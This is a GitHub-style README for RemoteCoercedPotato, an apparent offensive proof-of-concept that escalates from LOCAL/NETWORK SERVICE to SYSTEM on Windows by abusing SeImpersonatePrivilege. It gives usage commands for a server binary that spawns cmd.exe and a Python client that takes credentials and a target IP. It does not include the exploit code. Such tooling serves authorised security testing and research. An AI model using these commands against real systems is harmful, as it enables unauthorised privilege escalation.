```txt
Remote
   ____                            _ ____       _        _        
  / ___|___   ___ _ __ ___ ___  __| |  _ \ ___ | |_ __ _| |_ ___  
 | |   / _ \ / _ \ '__/ __/ _ \/ _` | |_) / _ \| __/ _` | __/ _ \ 
 | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |
  \____\___/ \___|_|  \___\___|\__,_|_|   \___/ \__\__,_|\__\___/ 
                                                                  
                                           @Hack0ura @Prepouce                         
```

# RemoteCoercedPotato
A quick POC of a Coerced Patate but remotly (just for fun).

From Patate (LOCAL/NETWORK SERVICE) to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10, Windows 11 and Server 2022.

For more information: [https://blog.hackvens.fr/articles/CoercedPotato.html](https://blog.hackvens.fr/articles/CoercedPotato.html) (The english version is coming soon!! 😄)

## A very quick PoooooC:

Usage : 

You can check the help message using the `--help` option.

- Without random namedpipe (default):
```txt
    ./CoercedPotatoServer.exe -c cmd.exe
```
```txt
    ./CoercedPotatoClient.py -u user -p password 127.0.0.1 [targeted_IP]
```

 - With a random namedpipe, given by CoercedPotatoServer.exe: 
```txt 
    ./CoercedPotatoServer.exe -c cmd.exe -r true 
```
```txt        
    ./CoercedPotatoClient.py -n [randomnamedpipe] -u user -p password -r true 127.0.0.1 [targeted_IP] 
```



## Todo 
 
- Implemention of MS-RPRN interfacce 
    
- Creation a powershell of a bytecode version of the namedPipe server 


Made in France 🇫🇷 with <3
